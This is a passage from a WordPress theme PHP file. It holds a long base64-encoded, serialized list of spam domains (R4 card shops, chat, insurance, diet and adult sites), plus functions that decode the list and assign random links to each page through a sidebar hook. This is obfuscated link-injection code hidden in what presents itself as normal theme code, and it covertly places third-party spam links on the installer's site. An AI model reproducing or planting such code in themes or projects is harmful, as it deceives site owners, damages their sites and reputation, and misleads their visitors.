nI0M2RzYmxvZ3MuY29tIjtzOjI1OiJodHRwOi8vd3d3LnI0M2RzYmxvZ3MuY29tIjtzOjI1OiJodHRwOi8vd3d3LnI0M2RzYmxvZ3MuY29tIjtzOjE0OiJyNDNkc2Jsb2dzLmNvbSI7czoyNToiaHR0cDovL3d3dy5yNDNkc2Jsb2dzLmNvbSI7czoxOToid3d3LnI0M2RzYWR2aWNlLmNvbSI7czoyNjoiaHR0cDovL3d3dy5yNDNkc2FkdmljZS5jb20iO3M6MjY6Imh0dHA6Ly93d3cucjQzZHNhZHZpY2UuY29tIjtzOjI2OiJodHRwOi8vd3d3LnI0M2RzYWR2aWNlLmNvbSI7czoxNToicjQzZHNhZHZpY2UuY29tIjtzOjI2OiJodHRwOi8vd3d3LnI0M2RzYWR2aWNlLmNvbSI7czoyMzoid3d3LnNlc2xpY2hhdHNvaGJldC5uZXQiO3M6MzA6Imh0dHA6Ly93d3cuc2VzbGljaGF0c29oYmV0Lm5ldCI7czozMDoiaHR0cDovL3d3dy5zZXNsaWNoYXRzb2hiZXQubmV0IjtzOjMwOiJodHRwOi8vd3d3LnNlc2xpY2hhdHNvaGJldC5uZXQiO3M6MTk6InNlc2xpY2hhdHNvaGJldC5uZXQiO3M6MzA6Imh0dHA6Ly93d3cuc2VzbGljaGF0c29oYmV0Lm5ldCI7czoyNjoid3d3LnJlbW92YWxzd2l0aGFzbWlsZS5jb20iO3M6MzM6Imh0dHA6Ly93d3cucmVtb3ZhbHN3aXRoYXNtaWxlLmNvbSI7czozMzoiaHR0cDovL3d3dy5yZW1vdmFsc3dpdGhhc21pbGUuY29tIjtzOjMzOiJodHRwOi8vd3d3LnJlbW92YWxzd2l0aGFzbWlsZS5jb20iO3M6MjI6InJlbW92YWxzd2l0aGFzbWlsZS5jb20iO3M6MzM6Imh0dHA6Ly93d3cucmVtb3ZhbHN3aXRoYXNtaWxlLmNvbSI7czoxNjoid3d3LnNpcG5zdGlyLm5ldCI7czoyMzoiaHR0cDovL3d3dy5zaXBuc3Rpci5uZXQiO3M6MjM6Imh0dHA6Ly93d3cuc2lwbnN0aXIubmV0IjtzOjIzOiJodHRwOi8vd3d3LnNpcG5zdGlyLm5ldCI7czoxMjoic2lwbnN0aXIubmV0IjtzOjIzOiJodHRwOi8vd3d3LnNpcG5zdGlyLm5ldCI7czoxMzoid3d3LkktcjRpLmNvbSI7czoyMDoiaHR0cDovL3d3dy5JLXI0aS5jb20iO3M6MjA6Imh0dHA6Ly93d3cuSS1yNGkuY29tIjtzOjIwOiJodHRwOi8vd3d3LkktcjRpLmNvbSI7czo5OiJJLXI0aS5jb20iO3M6MjA6Imh0dHA6Ly93d3cuSS1yNGkuY29tIjtzOjIwOiJ3d3cubWVsZmljYXBpdGFsZS5pdCI7czoyNzoiaHR0cDovL3d3dy5tZWxmaWNhcGl0YWxlLml0IjtzOjI3OiJodHRwOi8vd3d3Lm1lbGZpY2FwaXRhbGUuaXQiO3M6Mjc6Imh0dHA6Ly93d3cubWVsZmljYXBpdGFsZS5pdCI7czoxNjoibWVsZmljYXBpdGFsZS5pdCI7czoyNzoiaHR0cDovL3d3dy5tZWxmaWNhcGl0YWxlLml0IjtzOjI4OiJ3d3cucmlzdG9yYW50ZWxhZ29naGVkaW5hLml0IjtzOjM1OiJodHRwOi8vd3d3LnJpc3RvcmFudGVsYWdvZ2hlZGluYS5pdCI7czozNToiaHR0cDovL3d3dy5yaXN0b3JhbnRlbGFnb2doZWRpbmEuaXQiO3M6MzU6Imh0dHA6Ly93d3cucmlzdG9yYW50ZWxhZ29naGVkaW5hLml0IjtzOjI0OiJyaXN0b3JhbnRlbGFnb2doZWRpbmEuaXQiO3M6MzU6Imh0dHA6Ly93d3cucmlzdG9yYW50ZWxhZ29naGVkaW5hLml0IjtzOjIxOiJ3d3cuYmxlbmRpYmVyaWEwOS5vcmciO3M6Mjg6Imh0dHA6Ly93d3cuYmxlbmRpYmVyaWEwOS5vcmciO3M6Mjg6Imh0dHA6Ly93d3cuYmxlbmRpYmVyaWEwOS5vcmciO3M6Mjg6Imh0dHA6Ly93d3cuYmxlbmRpYmVyaWEwOS5vcmciO3M6MTc6ImJsZW5kaWJlcmlhMDkub3JnIjtzOjI4OiJodHRwOi8vd3d3LmJsZW5kaWJlcmlhMDkub3JnIjtzOjE4OiJ3d3cuY3Jvd3NvdXJjZS5vcmciO3M6MjU6Imh0dHA6Ly93d3cuY3Jvd3NvdXJjZS5vcmciO3M6MjU6Imh0dHA6Ly93d3cuY3Jvd3NvdXJjZS5vcmciO3M6MjU6Imh0dHA6Ly93d3cuY3Jvd3NvdXJjZS5vcmciO3M6MTQ6ImNyb3dzb3VyY2Uub3JnIjtzOjI1OiJodHRwOi8vd3d3LmNyb3dzb3VyY2Uub3JnIjtzOjI5OiJ3d3cubW90b3JjeWNsZWZhaXJpbmdpbmZvLmNvbSI7czozNjoiaHR0cDovL3d3dy5tb3RvcmN5Y2xlZmFpcmluZ2luZm8uY29tIjtzOjM2OiJodHRwOi8vd3d3Lm1vdG9yY3ljbGVmYWlyaW5naW5mby5jb20iO3M6MzY6Imh0dHA6Ly93d3cubW90b3JjeWNsZWZhaXJpbmdpbmZvLmNvbSI7czoyNToibW90b3JjeWNsZWZhaXJpbmdpbmZvLmNvbSI7czozNjoiaHR0cDovL3d3dy5tb3RvcmN5Y2xlZmFpcmluZ2luZm8uY29tIjtzOjI5OiJ3d3cubW90b3JjeWNsZWZhaXJpbmdtYWluLmNvbSI7czozNjoiaHR0cDovL3d3dy5tb3RvcmN5Y2xlZmFpcmluZ21haW4uY29tIjtzOjM2OiJodHRwOi8vd3d3Lm1vdG9yY3ljbGVmYWlyaW5nbWFpbi5jb20iO3M6MzY6Imh0dHA6Ly93d3cubW90b3JjeWNsZWZhaXJpbmdtYWluLmNvbSI7czoyNToibW90b3JjeWNsZWZhaXJpbmdtYWluLmNvbSI7czozNjoiaHR0cDovL3d3dy5tb3RvcmN5Y2xlZmFpcmluZ21haW4uY29tIjtzOjI5OiJ3d3cubW90b3JjeWNsZWZhaXJpbmdzdG9wLmNvbSI7czozNjoiaHR0cDovL3d3dy5tb3RvcmN5Y2xlZmFpcmluZ3N0b3AuY29tIjtzOjM2OiJodHRwOi8vd3d3Lm1vdG9yY3ljbGVmYWlyaW5nc3RvcC5jb20iO3M6MzY6Imh0dHA6Ly93d3cubW90b3JjeWNsZWZhaXJpbmdzdG9wLmNvbSI7czoyNToibW90b3JjeWNsZWZhaXJpbmdzdG9wLmNvbSI7czozNjoiaHR0cDovL3d3dy5tb3RvcmN5Y2xlZmFpcmluZ3N0b3AuY29tIjtzOjE4OiJ3d3cuY2FydGVyNGlkcy5jb20iO3M6MjU6Imh0dHA6Ly93d3cuY2FydGVyNGlkcy5jb20iO3M6MjU6Imh0dHA6Ly93d3cuY2FydGVyNGlkcy5jb20iO3M6MjU6Imh0dHA6Ly93d3cuY2FydGVyNGlkcy5jb20iO3M6MTQ6ImNhcnRlcjRpZHMuY29tIjtzOjI1OiJodHRwOi8vd3d3LmNhcnRlcjRpZHMuY29tIjtzOjI2OiJ3d3cuYjJjd29ybGR3aWRlaG90ZWxzLmNvbSI7czozMzoiaHR0cDovL3d3dy5iMmN3b3JsZHdpZGVob3RlbHMuY29tIjtzOjMzOiJodHRwOi8vd3d3LmIyY3dvcmxkd2lkZWhvdGVscy5jb20iO3M6MzM6Imh0dHA6Ly93d3cuYjJjd29ybGR3aWRlaG90ZWxzLmNvbSI7czoyMjoiYjJjd29ybGR3aWRlaG90ZWxzLmNvbSI7czozMzoiaHR0cDovL3d3dy5iMmN3b3JsZHdpZGVob3RlbHMuY29tIjtzOjE2OiJ3d3cucjRpc2RoY3guY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0aXNkaGN4LmNvbSI7czoyMzoiaHR0cDovL3d3dy5yNGlzZGhjeC5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRpc2RoY3guY29tIjtzOjEyOiJyNGlzZGhjeC5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRpc2RoY3guY29tIjtzOjE0OiJ3d3cuZHN0dHVrLmNvbSI7czoyMToiaHR0cDovL3d3dy5kc3R0dWsuY29tIjtzOjIxOiJodHRwOi8vd3d3LmRzdHR1ay5jb20iO3M6MjE6Imh0dHA6Ly93d3cuZHN0dHVrLmNvbSI7czoxMDoiZHN0dHVrLmNvbSI7czoyMToiaHR0cDovL3d3dy5kc3R0dWsuY29tIjtzOjE3OiJ3d3cudGFvaHVhYW4uaW5mbyI7czoyNDoiaHR0cDovL3d3dy50YW9odWFhbi5pbmZvIjtzOjI0OiJodHRwOi8vd3d3LnRhb2h1YWFuLmluZm8iO3M6MjQ6Imh0dHA6Ly93d3cudGFvaHVhYW4uaW5mbyI7czoxMzoidGFvaHVhYW4uaW5mbyI7czoyNDoiaHR0cDovL3d3dy50YW9odWFhbi5pbmZvIjtzOjIzOiJ3d3cuc3VkYW1lcmljYXNwb3J0LmNvbSI7czozMDoiaHR0cDovL3d3dy5zdWRhbWVyaWNhc3BvcnQuY29tIjtzOjMwOiJodHRwOi8vd3d3LnN1ZGFtZXJpY2FzcG9ydC5jb20iO3M6MzA6Imh0dHA6Ly93d3cuc3VkYW1lcmljYXNwb3J0LmNvbSI7czoxOToic3VkYW1lcmljYXNwb3J0LmNvbSI7czozMDoiaHR0cDovL3d3dy5zdWRhbWVyaWNhc3BvcnQuY29tIjtzOjE4OiJ3d3cuYWlodWFpeWFuZy5jb20iO3M6MjU6Imh0dHA6Ly93d3cuYWlodWFpeWFuZy5jb20iO3M6MjU6Imh0dHA6Ly93d3cuYWlodWFpeWFuZy5jb20iO3M6MjU6Imh0dHA6Ly93d3cuYWlodWFpeWFuZy5jb20iO3M6MTQ6ImFpaHVhaXlhbmcuY29tIjtzOjI1OiJodHRwOi8vd3d3LmFpaHVhaXlhbmcuY29tIjtzOjE1OiJ3d3cucjRpLTNkcy5uZXQiO3M6MjI6Imh0dHA6Ly93d3cucjRpLTNkcy5uZXQiO3M6MjI6Imh0dHA6Ly93d3cucjRpLTNkcy5uZXQiO3M6MjI6Imh0dHA6Ly93d3cucjRpLTNkcy5uZXQiO3M6MTE6InI0aS0zZHMubmV0IjtzOjIyOiJodHRwOi8vd3d3LnI0aS0zZHMubmV0IjtzOjE5OiJ3d3cucjRpc2RoYzNkc3guY29tIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMzZHN4LmNvbSI7czoyNjoiaHR0cDovL3d3dy5yNGlzZGhjM2RzeC5jb20iO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYzNkc3guY29tIjtzOjE1OiJyNGlzZGhjM2RzeC5jb20iO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYzNkc3guY29tIjtzOjE2OiJ3d3cuaGl6bGltcDMuY29tIjtzOjIzOiJodHRwOi8vd3d3LmhpemxpbXAzLmNvbSI7czoyMzoiaHR0cDovL3d3dy5oaXpsaW1wMy5jb20iO3M6MjM6Imh0dHA6Ly93d3cuaGl6bGltcDMuY29tIjtzOjEyOiJoaXpsaW1wMy5jb20iO3M6MjM6Imh0dHA6Ly93d3cuaGl6bGltcDMuY29tIjtzOjE1OiJ3d3cuMDU5MnRlYS5vcmciO3M6MjI6Imh0dHA6Ly93d3cuMDU5MnRlYS5vcmciO3M6MjI6Imh0dHA6Ly93d3cuMDU5MnRlYS5vcmciO3M6MjI6Imh0dHA6Ly93d3cuMDU5MnRlYS5vcmciO3M6MTE6IjA1OTJ0ZWEub3JnIjtzOjIyOiJodHRwOi8vd3d3LjA1OTJ0ZWEub3JnIjtzOjE3OiJ3d3cuZ2F5bWFzYWouaW5mbyI7czoyNDoiaHR0cDovL3d3dy5nYXltYXNhai5pbmZvIjtzOjI0OiJodHRwOi8vd3d3LmdheW1hc2FqLmluZm8iO3M6MjQ6Imh0dHA6Ly93d3cuZ2F5bWFzYWouaW5mbyI7czoxMzoiZ2F5bWFzYWouaW5mbyI7czoyNDoiaHR0cDovL3d3dy5nYXltYXNhai5pbmZvIjtzOjE5OiJ3d3cuZjEtc29ubmVyaWUuY29tIjtzOjI2OiJodHRwOi8vd3d3LmYxLXNvbm5lcmllLmNvbSI7czoyNjoiaHR0cDovL3d3dy5mMS1zb25uZXJpZS5jb20iO3M6MjY6Imh0dHA6Ly93d3cuZjEtc29ubmVyaWUuY29tIjtzOjE1OiJmMS1zb25uZXJpZS5jb20iO3M6MjY6Imh0dHA6Ly93d3cuZjEtc29ubmVyaWUuY29tIjtzOjI0OiJ3d3cubmlraWJpY2FyZS1qb2hvLmluZm8iO3M6MzE6Imh0dHA6Ly93d3cubmlraWJpY2FyZS1qb2hvLmluZm8iO3M6MzE6Imh0dHA6Ly93d3cubmlraWJpY2FyZS1qb2hvLmluZm8iO3M6MzE6Imh0dHA6Ly93d3cubmlraWJpY2FyZS1qb2hvLmluZm8iO3M6MjA6Im5pa2liaWNhcmUtam9oby5pbmZvIjtzOjMxOiJodHRwOi8vd3d3Lm5pa2liaWNhcmUtam9oby5pbmZvIjtzOjE0OiJ3d3cuODg5OTM0LmNvbSI7czoyMToiaHR0cDovL3d3dy44ODk5MzQuY29tIjtzOjIxOiJodHRwOi8vd3d3Ljg4OTkzNC5jb20iO3M6MjE6Imh0dHA6Ly93d3cuODg5OTM0LmNvbSI7czoxMDoiODg5OTM0LmNvbSI7czoyMToiaHR0cDovL3d3dy44ODk5MzQuY29tIjtzOjM2OiJ3d3cuY2hvb3NlLWxpZmUtaW5zdXJhbmNlLXF1b3Rlcy5jb20iO3M6NDM6Imh0dHA6Ly93d3cuY2hvb3NlLWxpZmUtaW5zdXJhbmNlLXF1b3Rlcy5jb20iO3M6NDM6Imh0dHA6Ly93d3cuY2hvb3NlLWxpZmUtaW5zdXJhbmNlLXF1b3Rlcy5jb20iO3M6NDM6Imh0dHA6Ly93d3cuY2hvb3NlLWxpZmUtaW5zdXJhbmNlLXF1b3Rlcy5jb20iO3M6MzI6ImNob29zZS1saWZlLWluc3VyYW5jZS1xdW90ZXMuY29tIjtzOjQzOiJodHRwOi8vd3d3LmNob29zZS1saWZlLWluc3VyYW5jZS1xdW90ZXMuY29tIjtzOjMwOiJ3d3cuYWR1bHRmcmVlZG9tZm91bmRhdGlvbi5vcmciO3M6Mzc6Imh0dHA6Ly93d3cuYWR1bHRmcmVlZG9tZm91bmRhdGlvbi5vcmciO3M6Mzc6Imh0dHA6Ly93d3cuYWR1bHRmcmVlZG9tZm91bmRhdGlvbi5vcmciO3M6Mzc6Imh0dHA6Ly93d3cuYWR1bHRmcmVlZG9tZm91bmRhdGlvbi5vcmciO3M6MjY6ImFkdWx0ZnJlZWRvbWZvdW5kYXRpb24ub3JnIjtzOjM3OiJodHRwOi8vd3d3LmFkdWx0ZnJlZWRvbWZvdW5kYXRpb24ub3JnIjtzOjE3OiJ3d3cuYXR1b25saW5lLm9yZyI7czoyNDoiaHR0cDovL3d3dy5hdHVvbmxpbmUub3JnIjtzOjI0OiJodHRwOi8vd3d3LmF0dW9ubGluZS5vcmciO3M6MjQ6Imh0dHA6Ly93d3cuYXR1b25saW5lLm9yZyI7czoxMzoiYXR1b25saW5lLm9yZyI7czoyNDoiaHR0cDovL3d3dy5hdHVvbmxpbmUub3JnIjtzOjMwOiJ3d3cuaGVhbHRoLXBsYW4tZGlyZWN0b3J5LmluZm8iO3M6Mzc6Imh0dHA6Ly93d3cuaGVhbHRoLXBsYW4tZGlyZWN0b3J5LmluZm8iO3M6Mzc6Imh0dHA6Ly93d3cuaGVhbHRoLXBsYW4tZGlyZWN0b3J5LmluZm8iO3M6Mzc6Imh0dHA6Ly93d3cuaGVhbHRoLXBsYW4tZGlyZWN0b3J5LmluZm8iO3M6MjY6ImhlYWx0aC1wbGFuLWRpcmVjdG9yeS5pbmZvIjtzOjM3OiJodHRwOi8vd3d3LmhlYWx0aC1wbGFuLWRpcmVjdG9yeS5pbmZvIjtzOjE2OiJ3d3cuaWNhcnRlcjQuY29tIjtzOjIzOiJodHRwOi8vd3d3LmljYXJ0ZXI0LmNvbSI7czoyMzoiaHR0cDovL3d3dy5pY2FydGVyNC5jb20iO3M6MjM6Imh0dHA6Ly93d3cuaWNhcnRlcjQuY29tIjtzOjEyOiJpY2FydGVyNC5jb20iO3M6MjM6Imh0dHA6Ly93d3cuaWNhcnRlcjQuY29tIjtzOjE5OiJ3d3cuY2FydGVzcjQzZHMuY29tIjtzOjI2OiJodHRwOi8vd3d3LmNhcnRlc3I0M2RzLmNvbSI7czoyNjoiaHR0cDovL3d3dy5jYXJ0ZXNyNDNkcy5jb20iO3M6MjY6Imh0dHA6Ly93d3cuY2FydGVzcjQzZHMuY29tIjtzOjE1OiJjYXJ0ZXNyNDNkcy5jb20iO3M6MjY6Imh0dHA6Ly93d3cuY2FydGVzcjQzZHMuY29tIjtzOjI2OiJ3d3cuc2FmZnJvbmV4dHJhY3RzaXRlLmNvbSI7czozMzoiaHR0cDovL3d3dy5zYWZmcm9uZXh0cmFjdHNpdGUuY29tIjtzOjMzOiJodHRwOi8vd3d3LnNhZmZyb25leHRyYWN0c2l0ZS5jb20iO3M6MzM6Imh0dHA6Ly93d3cuc2FmZnJvbmV4dHJhY3RzaXRlLmNvbSI7czoyMjoic2FmZnJvbmV4dHJhY3RzaXRlLmNvbSI7czozMzoiaHR0cDovL3d3dy5zYWZmcm9uZXh0cmFjdHNpdGUuY29tIjtzOjIxOiJ3d3cudXNoY2dkaWV0cGxhbi5jb20iO3M6Mjg6Imh0dHA6Ly93d3cudXNoY2dkaWV0cGxhbi5jb20iO3M6Mjg6Imh0dHA6Ly93d3cudXNoY2dkaWV0cGxhbi5jb20iO3M6Mjg6Imh0dHA6Ly93d3cudXNoY2dkaWV0cGxhbi5jb20iO3M6MTc6InVzaGNnZGlldHBsYW4uY29tIjtzOjI4OiJodHRwOi8vd3d3LnVzaGNnZGlldHBsYW4uY29tIjtzOjE0OiJ3d3cucjRpLWl0LmNvbSI7czoyMToiaHR0cDovL3d3dy5yNGktaXQuY29tIjtzOjIxOiJodHRwOi8vd3d3LnI0aS1pdC5jb20iO3M6MjE6Imh0dHA6Ly93d3cucjRpLWl0LmNvbSI7czoxMDoicjRpLWl0LmNvbSI7czoyMToiaHR0cDovL3d3dy5yNGktaXQuY29tIjtzOjE2OiJ3d3cucjRrYWFydGRzLm5sIjtzOjIzOiJodHRwOi8vd3d3LnI0a2FhcnRkcy5ubCI7czoyMzoiaHR0cDovL3d3dy5yNGthYXJ0ZHMubmwiO3M6MjM6Imh0dHA6Ly93d3cucjRrYWFydGRzLm5sIjtzOjEyOiJyNGthYXJ0ZHMubmwiO3M6MjM6Imh0dHA6Ly93d3cucjRrYWFydGRzLm5sIjtzOjE0OiJ3d3cuaXI0c2RoYy5pdCI7czoyMToiaHR0cDovL3d3dy5pcjRzZGhjLml0IjtzOjIxOiJodHRwOi8vd3d3LmlyNHNkaGMuaXQiO3M6MjE6Imh0dHA6Ly93d3cuaXI0c2RoYy5pdCI7czoxMDoiaXI0c2RoYy5pdCI7czoyMToiaHR0cDovL3d3dy5pcjRzZGhjLml0IjtzOjEyOiJ3d3cudHRkcy5vcmciO3M6MTk6Imh0dHA6Ly93d3cudHRkcy5vcmciO3M6MTk6Imh0dHA6Ly93d3cudHRkcy5vcmciO3M6MTk6Imh0dHA6Ly93d3cudHRkcy5vcmciO3M6ODoidHRkcy5vcmciO3M6MTk6Imh0dHA6Ly93d3cudHRkcy5vcmciO3M6MTk6Ind3dy5jaGVhcGllc2hvZS5jb20iO3M6MjY6Imh0dHA6Ly93d3cuY2hlYXBpZXNob2UuY29tIjtzOjI2OiJodHRwOi8vd3d3LmNoZWFwaWVzaG9lLmNvbSI7czoyNjoiaHR0cDovL3d3dy5jaGVhcGllc2hvZS5jb20iO3M6MTU6ImNoZWFwaWVzaG9lLmNvbSI7czoyNjoiaHR0cDovL3d3dy5jaGVhcGllc2hvZS5jb20iO3M6MTU6Ind3dy5iMTJzaG90cy51cyI7czoyMjoiaHR0cDovL3d3dy5iMTJzaG90cy51cyI7czoyMjoiaHR0cDovL3d3dy5iMTJzaG90cy51cyI7czoyMjoiaHR0cDovL3d3dy5iMTJzaG90cy51cyI7czoxMToiYjEyc2hvdHMudXMiO3M6MjI6Imh0dHA6Ly93d3cuYjEyc2hvdHMudXMiO319"; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_initialize_the_theme_load(); get_sidebar($the_sidebar); } }
?>